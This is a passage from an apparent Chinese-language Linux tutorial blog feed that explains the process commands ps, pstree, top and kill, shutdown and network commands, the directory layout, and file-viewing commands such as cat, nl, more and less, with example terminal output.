</li>
<li class="lvl-2">
<p>ps -A 显示所有程序。</p>
</li>
<li class="lvl-2">
<p>ps c 列出程序时，显示每个程序真正的指令名称，而不包含路 径，参数或常驻服务的标示。</p>
</li>
<li class="lvl-2">
<p>ps -e 此参数的效果和指定&quot;A&quot;参数相同。</p>
</li>
<li class="lvl-2">
<p>ps e 列出程序时，显示每个程序所使用的环境变量。</p>
</li>
<li class="lvl-2">
<p>ps f 用ASCII字符显示树状结构，表达程序间的相互关系。</p>
</li>
<li class="lvl-2">
<p>ps -H 显示树状结构，表示程序间的相互关系。</p>
</li>
<li class="lvl-2">
<p>ps -N 显示所有的程序，除了执行ps指令终端机下的程序之外。</p>
</li>
<li class="lvl-2">
<p>ps s 采用程序信号的格式显示程序状况。</p>
</li>
<li class="lvl-2">
<p>ps u 以用户为主的格式来显示程序状况。</p>
</li>
<li class="lvl-2">
<p>ps x 显示所有程序，不以终端机来区分。</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>-a</td>
<td>显示终端上的所有进程，包括其他用户的进程</td>
</tr>
<tr>
<td>-u</td>
<td>显示进程的详细状态</td>
</tr>
<tr>
<td>-x</td>
<td>显示没有控制终端的进程</td>
</tr>
<tr>
<td>-w</td>
<td>显示加宽，以便显示更多的信息</td>
</tr>
<tr>
<td>-r</td>
<td>只显示正在运行的进程</td>
</tr>
</tbody>
</table>
<p><strong>常见用法：</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>ps -e 查看所有进程信息（瞬时的）</p>
</li>
<li class="lvl-2">
<p>ps -u root -N 查看所有不是root运行的进程</p>
</li>
<li class="lvl-2">
<p>ps ax 显示所有进程状态状态</p>
</li>
<li class="lvl-2">
<p>ps -ef |grep xxx 显示含有xxx的进程</p>
</li>
</ul>
<p>实例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# ps -A</span><br><span class="line">    PID TTY          TIME CMD</span><br><span class="line">      1 ?        00:00:01 systemd</span><br><span class="line">      2 ?        00:00:00 kthreadd</span><br><span class="line">……省略部分结果</span><br><span class="line">   2207 ?        00:00:00 kworker/1:1-events</span><br><span class="line">   2208 ?        00:00:00 kworker/0:0-ata_sff</span><br><span class="line">   2215 ?        00:00:00 kworker/0:2-ata_sff</span><br><span class="line">   2217 pts/1    00:00:00 ps</span><br></pre></td></tr></table></figure>
<p>显示指定用户信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ps -u root //显示root进程用户信息</span></span><br><span class="line"> PID TTY     TIME CMD</span><br><span class="line">  1 ?    00:00:02 init</span><br><span class="line">  2 ?    00:00:00 kthreadd</span><br><span class="line">  3 ?    00:00:00 migration/0</span><br><span class="line">……省略部分结果</span><br><span class="line">30487 ?    00:00:06 gnome-terminal</span><br><span class="line">30488 ?    00:00:00 gnome-pty-helpe</span><br><span class="line">30489 pts/0  00:00:00 bash</span><br></pre></td></tr></table></figure>
<p>显示所有进程信息，连同命令行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ps -ef //显示所有命令，连带命令行</span></span><br><span class="line">UID    PID PPID C STIME TTY     TIME CMD</span><br><span class="line">root     1   0 0 10:22 ?    00:00:02 /sbin/init</span><br><span class="line">root     2   0 0 10:22 ?    00:00:00 [kthreadd]</span><br><span class="line">root     3   2 0 10:22 ?    00:00:00 [migration/0]</span><br><span class="line">root     4   2 0 10:22 ?    00:00:00 [ksoftirqd/0]</span><br><span class="line">root     5   2 0 10:22 ?    00:00:00 [watchdog/0]</span><br><span class="line">root     6   2 0 10:22 ?    /usr/lib/NetworkManager</span><br><span class="line">……省略部分结果</span><br><span class="line">root   31302 2095 0 17:42 ?    00:00:00 sshd: root@pts/2 </span><br><span class="line">root   31374 31302 0 17:42 pts/2  00:00:00 -bash</span><br><span class="line">root   31400   1 0 17:46 ?    00:00:00 /usr/bin/python /usr/sbin/aptd</span><br><span class="line">root   31407 31374 0 17:48 pts/2  00:00:00 ps -ef</span><br></pre></td></tr></table></figure>
<h2 id="以树状图显示进程关系：pstree">以树状图显示进程关系：pstree</h2>
<p>显示进程的关系</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# pstree</span><br><span class="line">systemd─┬─NetworkManager───2*[&#123;NetworkManager&#125;]</span><br><span class="line">        ├─atd</span><br><span class="line">        ├─auditd───&#123;auditd&#125;</span><br><span class="line">        ├─crond</span><br><span class="line">        ├─dbus-daemon───&#123;dbus-daemon&#125;</span><br><span class="line">        ├─firewalld───&#123;firewalld&#125;</span><br><span class="line">        ├─irqbalance───&#123;irqbalance&#125;</span><br><span class="line">        ├─login───bash───su───bash───su───bash</span><br><span class="line">        ├─lsmd</span><br><span class="line">        ├─mcelog</span><br><span class="line">        ├─polkitd───5*[&#123;polkitd&#125;]</span><br><span class="line">        ├─smartd</span><br><span class="line">        ├─sshd─┬─sshd───sshd───bash</span><br><span class="line">        │      └─sshd───sshd───bash───pstree</span><br><span class="line">        ├─systemd───(sd-pam)</span><br><span class="line">        ├─systemd-journal</span><br><span class="line">        ├─systemd-logind</span><br><span class="line">        ├─systemd-udevd</span><br><span class="line">        └─tuned───3*[&#123;tuned&#125;]</span><br><span class="line">        </span><br><span class="line">[root@rocky8:~]# pstree -p</span><br><span class="line">systemd(1)─┬─NetworkManager(816)─┬─&#123;NetworkManager&#125;(821)</span><br><span class="line">           │                     └─&#123;NetworkManager&#125;(823)</span><br><span class="line">           ├─atd(835)</span><br><span class="line">           ├─auditd(768)───&#123;auditd&#125;(769)</span><br><span class="line">           ├─crond(841)</span><br><span class="line">           ├─dbus-daemon(796)───&#123;dbus-daemon&#125;(802)</span><br><span class="line">           ├─firewalld(797)───&#123;firewalld&#125;(1030)</span><br><span class="line">           ├─irqbalance(792)───&#123;irqbalance&#125;(801)</span><br><span class="line">           ├─login(838)───bash(2012)───su(2043)───bash(2044)───su(2072)───bash(2076)</span><br><span class="line">           ├─lsmd(793)</span><br><span class="line">           ├─mcelog(798)</span><br><span class="line">           ├─polkitd(1035)─┬─&#123;polkitd&#125;(1051)</span><br><span class="line">           │               ├─&#123;polkitd&#125;(1052)</span><br><span class="line">           │               ├─&#123;polkitd&#125;(1058)</span><br><span class="line">           │               ├─&#123;polkitd&#125;(1059)</span><br><span class="line">           │               └─&#123;polkitd&#125;(1072)</span><br><span class="line">           ├─smartd(790)</span><br><span class="line">           ├─sshd(829)─┬─sshd(1577)───sshd(1592)───bash(1593)</span><br><span class="line">           │           └─sshd(1859)───sshd(1863)───bash(1864)───pstree(2220)</span><br><span class="line">           ├─systemd(1582)───(sd-pam)(1586)</span><br><span class="line">           ├─systemd-journal(633)</span><br><span class="line">           ├─systemd-logind(794)</span><br><span class="line">           ├─systemd-udevd(662)</span><br><span class="line">           └─tuned(827)─┬─&#123;tuned&#125;(1168)</span><br><span class="line">                        ├─&#123;tuned&#125;(1217)</span><br><span class="line">                        └─&#123;tuned&#125;(1248)</span><br><span class="line">[root@rocky8:~]# pstree -c</span><br><span class="line">systemd─┬─NetworkManager─┬─&#123;NetworkManager&#125;</span><br><span class="line">        │                └─&#123;NetworkManager&#125;</span><br><span class="line">        ├─atd</span><br><span class="line">        ├─auditd───&#123;auditd&#125;</span><br><span class="line">        ├─crond</span><br><span class="line">        ├─dbus-daemon───&#123;dbus-daemon&#125;</span><br><span class="line">        ├─firewalld───&#123;firewalld&#125;</span><br><span class="line">        ├─irqbalance───&#123;irqbalance&#125;</span><br><span class="line">        ├─login───bash───su───bash───su───bash</span><br><span class="line">        ├─lsmd</span><br><span class="line">        ├─mcelog</span><br><span class="line">        ├─polkitd─┬─&#123;polkitd&#125;</span><br><span class="line">        │         ├─&#123;polkitd&#125;</span><br><span class="line">        │         ├─&#123;polkitd&#125;</span><br><span class="line">        │         ├─&#123;polkitd&#125;</span><br><span class="line">        │         └─&#123;polkitd&#125;</span><br><span class="line">        ├─smartd</span><br><span class="line">        ├─sshd─┬─sshd───sshd───bash</span><br><span class="line">        │      └─sshd───sshd───bash───pstree</span><br><span class="line">        ├─systemd───(sd-pam)</span><br><span class="line">        ├─systemd-journal</span><br><span class="line">        ├─systemd-logind</span><br><span class="line">        ├─systemd-udevd</span><br><span class="line">        └─tuned─┬─&#123;tuned&#125;</span><br><span class="line">                ├─&#123;tuned&#125;</span><br><span class="line">                └─&#123;tuned&#125;</span><br></pre></td></tr></table></figure>
<p>特别表明在运行的进程：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pstree -apnh //显示进程间的关系</span></span><br></pre></td></tr></table></figure>
<p>同时显示用户名称：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pstree -u //显示用户名称</span></span><br></pre></td></tr></table></figure>
<h2 id="动态显示进程：top">动态显示进程：top</h2>
<p>top命令用来动态显示运行中的进程。top命令能够在运行后，在指定的时间间隔更新显示信息。-d参数可以指定显示信息更新的时间间隔。</p>
<p>在top命令执行后，可以按下按键得到对显示的结果进行排序：</p>
<table>
<thead>
<tr>
<th>按键</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>M</td>
<td>根据内存使用量来排序</td>
</tr>
<tr>
<td>P</td>
<td>根据CPU占有率来排序</td>
</tr>
<tr>
<td>T</td>
<td>根据进程运行时间的长短来排序</td>
</tr>
<tr>
<td>U</td>
<td>可以根据后面输入的用户名来筛选进程</td>
</tr>
<tr>
<td>K</td>
<td>可以根据后面输入的PID来杀死进程。</td>
</tr>
<tr>
<td>q</td>
<td>退出</td>
</tr>
<tr>
<td>h</td>
<td>获得帮助</td>
</tr>
</tbody>
</table>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# top</span><br><span class="line">top - 15:40:09 up  4:53,  3 <span class="built_in">users</span>,  load average: 1.06, 0.72, 0.37</span><br><span class="line">Tasks: 161 total,   2 running, 159 sleeping,   0 stopped,   0 zombie</span><br><span class="line">%Cpu(s):  0.2 us,  0.2 sy,  0.0 ni, 99.5 <span class="built_in">id</span>,  0.0 wa,  0.2 hi,  0.0 si,  0.0 st</span><br><span class="line">MiB Mem :   1746.4 total,   1230.0 free,    246.9 used,    269.5 buff/cache</span><br><span class="line">MiB Swap:   2068.0 total,   2068.0 free,      0.0 used.   1340.5 avail Mem </span><br><span class="line"></span><br><span class="line">    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND                                                          </span><br><span class="line">    827 root      20   0  618180  31188  15248 S   0.3   1.7   0:30.76 tuned                                                            </span><br><span class="line">      1 root      20   0  175088  13464   9064 S   0.0   0.8   0:01.40 systemd                                                          </span><br><span class="line">      2 root      20   0       0      0      0 S   0.0   0.0   0:00.01 kthreadd                                                         </span><br><span class="line">      3 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 rcu_gp                                                           </span><br><span class="line">      4 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 rcu_par_gp                                                       </span><br><span class="line">      5 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 slub_flushwq </span><br><span class="line">      ..................</span><br></pre></td></tr></table></figure>
<p>更高级的命令是htop，但需要安装：</p>
<p><img src="/posts/dd673edb//image-20250220163058799.png" alt="htop动态进程"></p>
<h2 id="终止进程：kill">终止进程：kill</h2>
<p>kill命令指定进程号的进程，需要配合 ps 使用。</p>
<p>使用格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">kill</span> [-signal] pid</span><br></pre></td></tr></table></figure>
<p>信号值从0到15，其中9为绝对终止，可以处理一般信号无法终止的进程。</p>
<h2 id="关机重启：reboot、shutdown、init">关机重启：reboot、shutdown、init</h2>
<table>
<thead>
<tr>
<th>命令</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>reboot</td>
<td>重新启动操作系统</td>
</tr>
<tr>
<td>shutdown –r now</td>
<td>重新启动操作系统，shutdown会给别的用户提示</td>
</tr>
<tr>
<td>shutdown -h now</td>
<td>立刻关机，其中now相当于时间为0的状态</td>
</tr>
<tr>
<td>shutdown -h 20:25</td>
<td>系统在今天的20:25 会关机</td>
</tr>
<tr>
<td>shutdown -h +10</td>
<td>系统再过十分钟后自动关机</td>
</tr>
<tr>
<td>init 0</td>
<td>关机</td>
</tr>
<tr>
<td>init 6</td>
<td>重启</td>
</tr>
</tbody>
</table>
<h2 id="查看或配置网卡信息：ifconfig">查看或配置网卡信息：ifconfig</h2>
<p>ifconfig显示所有网卡的信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# ifconfig</span><br><span class="line">ens160: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 10.0.0.191  netmask 255.255.255.0  broadcast 10.0.0.255</span><br><span class="line">        inet6 fe80::20c:29ff:fee9:9fb3  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 00:0c:29:e9:9f:b3  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 34362  bytes 34209026 (32.6 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 17179  bytes 1644986 (1.5 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 48  bytes 4080 (3.9 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 48  bytes 4080 (3.9 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>修改ip:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">sudo</span> ifconfig ens33 192.168.40.10</span><br><span class="line">[root@rocky8:~]# ifconfig ens33</span><br><span class="line">ens33     Link encap:以太网  硬件地址 00:0c:29:59:65:f2  </span><br><span class="line">          inet 地址:192.168.40.10  广播:192.168.40.255  掩码:255.255.255.0</span><br><span class="line">          inet6 地址: fe80::432f:6c4a:f47d:5f6b/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  跃点数:1</span><br><span class="line">          接收数据包:422818 错误:0 丢弃:0 过载:0 帧数:0</span><br><span class="line">          发送数据包:208692 错误:0 丢弃:0 过载:0 载波:0</span><br><span class="line">          碰撞:0 发送队列长度:1000 </span><br><span class="line">          接收字节:603745130 (603.7 MB)  发送字节:12822615 (12.8 MB)</span><br></pre></td></tr></table></figure>
<h2 id="测试远程主机连通性：ping">测试远程主机连通性：ping</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# ping baidu.com</span><br><span class="line">PING baidu.com (39.156.66.10) 56(84) bytes of data.</span><br><span class="line">64 bytes from 39.156.66.10 (39.156.66.10): icmp_seq=1 ttl=128 time=25.4 ms</span><br><span class="line">64 bytes from 39.156.66.10 (39.156.66.10): icmp_seq=2 ttl=128 time=25.1 ms</span><br><span class="line">64 bytes from 39.156.66.10 (39.156.66.10): icmp_seq=3 ttl=128 time=33.5 ms</span><br><span class="line">^C</span><br><span class="line">--- baidu.com ping statistics ---</span><br><span class="line">7 packets transmitted, 7 received, 0% packet loss, time 15100ms</span><br><span class="line">rtt min/avg/max/mdev = 24.992/26.546/33.483/2.870 ms</span><br><span class="line">[root@rocky8:~]# ping baidu.com -c 3</span><br><span class="line">PING baidu.com (39.156.66.10) 56(84) bytes of data.</span><br><span class="line">64 bytes from 39.156.66.10 (39.156.66.10): icmp_seq=1 ttl=128 time=26.4 ms</span><br><span class="line">64 bytes from 39.156.66.10 (39.156.66.10): icmp_seq=2 ttl=128 time=25.1 ms</span><br><span class="line">64 bytes from 39.156.66.10 (39.156.66.10): icmp_seq=3 ttl=128 time=29.8 ms</span><br><span class="line"></span><br><span class="line">--- baidu.com ping statistics ---</span><br><span class="line">3 packets transmitted, 3 received, 0% packet loss, time 11041ms</span><br><span class="line">rtt min/avg/max/mdev = 25.122/27.080/29.754/1.966 ms</span><br></pre></td></tr></table></figure>
<p>本文参考：</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】文件管理</title>
    <url>/posts/2d0621ba/</url>
    <content><![CDATA[<h2 id="Linux目录">Linux目录</h2>
<p><img src="/posts/2d0621ba//image-20250219153540620.png" alt="Linux目录"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>/：根目录，一般根目录下只存放目录，在Linux下有且只有一个根目录。所有的东西都是从这里开始。当你在终端里输入“/home”，你其实是在告诉电脑，先从/（根目录）开始，再进入到home目录。</p>
</li>
<li class="lvl-2">
<p>/bin: /usr/bin: 可执行二进制文件的目录，如常用的命令ls、tar、mv、cat等。</p>
</li>
<li class="lvl-2">
<p>/boot：放置linux系统启动时用到的一些文件，如Linux的内核文件：/boot/vmlinuz，系统引导管理器：/boot/grub。</p>
</li>
<li class="lvl-2">
<p>/dev：存放linux系统下的设备文件，访问该目录下某个文件，相当于访问某个设备，常用的是挂载光驱 mount /dev/cdrom /mnt。</p>
</li>
<li class="lvl-2">
<p>/etc：系统配置文件存放的目录，不建议在此目录下存放可执行文件，重要的配置文件有 /etc/inittab、/etc/fstab、/etc/init.d、/etc/X11、/etc/sysconfig、/etc/xinetd.d。</p>
</li>
<li class="lvl-2">
<p>/home：系统默认的用户家目录，新增用户账号时，用户的家目录都存放在此目录下，表示当前用户的家目录，edu 表示用户 edu 的家目录。</p>
</li>
<li class="lvl-2">
<p>/lib: /usr/lib: /usr/local/lib：系统使用的函数库的目录，程序在执行过程中，需要调用一些额外的参数时需要函数库的协助。</p>
</li>
<li class="lvl-2">
<p>/lost+fount：系统异常产生错误时，会将一些遗失的片段放置于此目录下。</p>
</li>
<li class="lvl-2">
<p>/mnt: /media：光盘默认挂载点，通常光盘挂载于 /mnt/cdrom 下，也不一定，可以选择任意位置进行挂载。</p>
</li>
<li class="lvl-2">
<p>/opt：给主机额外安装软件所摆放的目录。</p>
</li>
<li class="lvl-2">
<p>/proc：此目录的数据都在内存中，如系统核心，外部设备，网络状态，由于数据都存放于内存中，所以不占用磁盘空间，比较重要的目录有 /proc/cpuinfo、/proc/interrupts、/proc/dma、/proc/ioports、/proc/net/* 等。</p>
</li>
<li class="lvl-2">
<p>/root：系统管理员root的家目录。</p>
</li>
<li class="lvl-2">
<p>/sbin: /usr/sbin: /usr/local/sbin：放置系统管理员使用的可执行命令，如fdisk、shutdown、mount 等。与 /bin 不同的是，这几个目录是给系统管理员 root使用的命令，一般用户只能&quot;查看&quot;而不能设置和使用。</p>
</li>
<li class="lvl-2">
<p>/tmp：一般用户或正在执行的程序临时存放文件的目录，任何人都可以访问，重要数据不可放置在此目录下。</p>
</li>
<li class="lvl-2">
<p>/srv：服务启动之后需要访问的数据目录，如 www 服务需要访问的网页数据存放在 /srv/www 内。</p>
</li>
<li class="lvl-2">
<p>/usr：应用程序存放目录，/usr/bin 存放应用程序，/usr/share 存放共享数据，/usr/lib  存放不能直接运行的，却是许多程序运行所必需的一些函数库文件。/usr/local: 存放软件升级包。/usr/share/doc:  系统说明文件存放目录。/usr/share/man: 程序说明文件存放目录。</p>
</li>
<li class="lvl-2">
<p>/var：放置系统执行过程中经常变化的文件，如随时更改的日志文件 /var/log，/var/log/message：所有的登录文件存放目录，/var/spool/mail：邮件存放的目录，/var/run:程序或服务启动后，其PID存放在该目录下。</p>
</li>
</ul>
<p>位于/home/user，称之为用户工作目录或家目录,表示方式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/home/user</span><br><span class="line">~</span><br></pre></td></tr></table></figure>
<p>从/目录开始描述的路径为<strong>绝对路径</strong>，如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">ls</span> /usr</span><br></pre></td></tr></table></figure>
<p>从当前位置开始描述的路径为<strong>相对路径</strong>，如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ../../</span><br><span class="line"><span class="built_in">ls</span> abc/def</span><br></pre></td></tr></table></figure>
<p>每个目录下都有**.和…**</p>
<p>. 表示当前目录</p>
<p>… 表示上一级目录，即父目录</p>
<p>根目录下的.和…都表示当前目录</p>
<h2 id="基础操作">基础操作</h2>
<h4 id="输出重定向：">输出重定向：&gt;</h4>
<p>可将本应显示在终端上的内容保存到指定文件中。</p>
<p>如：ls &gt; test.txt ( test.txt 如果不存在，则创建，存在则覆盖其内容 )</p>
<p>注意： <code>&gt;输出重定向会覆盖原来的内容，&gt;&gt;输出重定向则会追加到文件的尾部。</code></p>
<h4 id="管道：">管道：|</h4>
<p>管道：一个命令的输出可以通过管道做为另一个命令的输入。</p>
<p>“ | ”的左右分为两端，从左端写入到右端。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:/bin$ ll -h |more   </span><br><span class="line">总用量 13M</span><br><span class="line">drwxr-xr-x  2 root root  4.0K 8月   4  2016 ./</span><br><span class="line">drwxr-xr-x 26 root root  4.0K 7月  30  2016 ../</span><br><span class="line">-rwxr-xr-x  1 root root 1014K 6月  24  2016 bash*</span><br><span class="line">-rwxr-xr-x  1 root root   31K 5月  20  2015 bunzip2*</span><br><span class="line">-rwxr-xr-x  1 root root  1.9M 8月  19  2015 busybox*</span><br><span class="line">-rwxr-xr-x  1 root root   31K 5月  20  2015 bzcat*</span><br><span class="line">lrwxrwxrwx  1 root root     6 5月  16  2016 bzcmp -&gt; bzdiff*</span><br><span class="line">-rwxr-xr-x  1 root root  2.1K 5月  20  2015 bzdiff*</span><br><span class="line">lrwxrwxrwx  1 root root     6 5月  16  2016 bzegrep -&gt; bzgrep*</span><br><span class="line">--更多--</span><br></pre></td></tr></table></figure>
<h4 id="清屏：clear">清屏：clear</h4>
<p>clear作用为清除终端上的显示(类似于DOS的cls清屏功能)，快捷键：Ctrl + l ( “l” 为字母 )。</p>
<h4 id="切换工作目录：-cd">切换工作目录： cd</h4>
<p>Linux所有的目录和文件名大小写敏感</p>
<p>cd后面可跟绝对路径，也可以跟相对路径。如果省略目录，则默认切换到当前用户的主目录。</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>cd</td>
<td>相当于cd ~</td>
</tr>
<tr>
<td>cd ~</td>
<td>切换到当前用户的主目录(/home/用户目录)</td>
</tr>
<tr>
<td>cd .</td>
<td>切换到当前目录</td>
</tr>
<tr>
<td>cd …</td>
<td>切换到上级目录</td>
</tr>
<tr>
<td>cd -</td>
<td>进入上次所在的目录</td>
</tr>
</tbody>
</table>
<h4 id="查看命令位置：which">查看命令位置：which</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~$ <span class="built_in">which</span> <span class="built_in">ls</span></span><br><span class="line">/bin/ls</span><br><span class="line">python@ubuntu:~$ <span class="built_in">which</span> <span class="built_in">sudo</span></span><br><span class="line">/usr/bin/sudo</span><br></pre></td></tr></table></figure>
<h2 id="查看文件内容">查看文件内容</h2>
<p>Linux系统中使用以下命令来查看文件的内容：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>cat 由第一行开始显示文件内容</p>
</li>
<li class="lvl-2">
<p>tac 从最后一行开始显示</p>
</li>
<li class="lvl-2">
<p>nl 显示的时候，顺道输出行号</p>
</li>
<li class="lvl-2">
<p>more 一页一页的显示文件内容</p>
</li>
<li class="lvl-2">
<p>less与more 类似，但可以往前翻页</p>
</li>
<li class="lvl-2">
<p>head 只看头几行</p>
</li>
<li class="lvl-2">
<p>tail 只看尾巴几行</p>
</li>
</ul>
<h4 id="基本显示：cat、tac">基本显示：cat、tac</h4>
<p>语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> [-AbEnTv]</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-A ：相当于 -vET 的整合选项，可列出一些特殊字符而不是空白而已；</p>
</li>
<li class="lvl-2">
<p>-v ：列出一些看不出来的特殊字符</p>
</li>
<li class="lvl-2">
<p>-E ：将结尾的断行字节 $ 显示出来；</p>
</li>
<li class="lvl-2">
<p>-T ：将 [tab] 按键以 ^I 显示出来；</p>
</li>
<li class="lvl-2">
<p>-b ：列出行号，空白行不标行号</p>
</li>
<li class="lvl-2">
<p>-n ：列出行号，连同空白行也会有行号</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:/]# <span class="built_in">cat</span> -b /etc/issue</span><br><span class="line">     1	\S</span><br><span class="line">     2	Kernel \r on an \m</span><br><span class="line"></span><br><span class="line">[root@rocky8:/]# <span class="built_in">cat</span> -n /etc/issue</span><br><span class="line">     1	\S</span><br><span class="line">     2	Kernel \r on an \m</span><br><span class="line">     3</span><br></pre></td></tr></table></figure>
<p>tac与cat命令刚好相反，文件内容从最后一行开始显示，可以看出 tac 是 cat 的倒着写！如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:/]# <span class="built_in">tac</span> /etc/issue</span><br><span class="line"></span><br><span class="line">Kernel \r on an \m</span><br><span class="line">\S</span><br></pre></td></tr></table></figure>
<h4 id="显示行号：nl">显示行号：nl</h4>
<p>语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nl</span> [-bnw] 文件</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-b ：指定行号指定的方式，主要有两种：<br>
-b a ：表示不论是否为空行，也同样列出行号(类似 cat -n)；<br>
-b t ：如果有空行，空的那一行不要列出行号(默认值)；</p>
</li>
<li class="lvl-2">
<p>-n ：列出行号表示的方法，主要有三种：<br>
-n ln ：行号在荧幕的最左方显示；<br>
-n rn ：行号在自己栏位的最右方显示，且不加 0 ；<br>
-n rz ：行号在自己栏位的最右方显示，且加 0 ；</p>
</li>
<li class="lvl-2">
<p>-w ：行号栏位的占用的位数。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:/]# <span class="built_in">nl</span> /etc/issue</span><br><span class="line">     1	\S</span><br><span class="line">     2	Kernel \r on an \m</span><br><span class="line">       </span><br></pre></td></tr></table></figure>
<h4 id="分屏显示：more、less">分屏显示：more、less</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:/]# more /etc/man_db.config </span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Generated automatically from man.conf.in by the</span></span><br><span class="line"><span class="comment"># configure script.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># man.conf from man-1.6d</span></span><br><span class="line">....(中间省略)....</span><br><span class="line">--More--(28%)  &lt;== 光标在这里等待命令</span><br></pre></td></tr></table></figure>
<p>more运行时可以输入的命令有：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>空白键 (space)：代表向下翻一页；</p>
</li>
<li class="lvl-2">
<p>Enter ：代表向下翻『一行』；</p>
</li>
<li class="lvl-2">
<p>/字串 ：代表在这个显示的内容当中，向下搜寻『字串』这个关键字；</p>
</li>
<li class="lvl-2">
<p>:f ：立刻显示出档名以及目前显示的行数；</p>
</li>
<li class="lvl-2">
<p>q ：代表立刻离开 more ，不再显示该文件内容。</p>
</li>
<li class="lvl-2">
<p>b 或 [ctrl]-b ：代表往回翻页，不过这动作只对文件有用，对管线无用。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:/]# less /etc/man.config</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Generated automatically from man.conf.in by the</span></span><br><span class="line"><span class="comment"># configure script.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># man.conf from man-1.6d</span></span><br><span class="line">....(中间省略)....</span><br><span class="line">:   &lt;== 这里可以等待你输入命令！</span><br></pre></td></tr></table></figure>
<p>less运行时可以输入的命令有：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>空白键 ：向下翻动一页；</p>
</li>
<li class="lvl-2">
<p>[pagedown]：向下翻动一页；</p>
</li>
<li class="lvl-2">
<p>[pageup] ：向上翻动一页；</p>
</li>
<li class="lvl-2">
<p>/字串 ：向下搜寻『字串』的功能；</p>
</li>
<li class="lvl-2">
<p>?字串 ：向上搜寻『字串』的功能；</p>
</li>
<li class="lvl-2">
<p>n ：重复前一个搜寻 (与 / 或 ? 有关！)</p>
</li>
<li class="lvl-2">
<p>N ：反向的重复前一个搜寻 (与 / 或 ? 有关！)</p>
</li>
<li class="lvl-2">
<p>q ：离开 less 这个程序；</p>
</li>
</ul>
<h4 id="取首尾n行：head、tail">取首尾n行：head、tail</h4>
<p>head取出文件前面几行</p>
<p>语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">head</span> [-n number] 文件 </span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-n ：后面接数字，代表显示几行的意思</p>
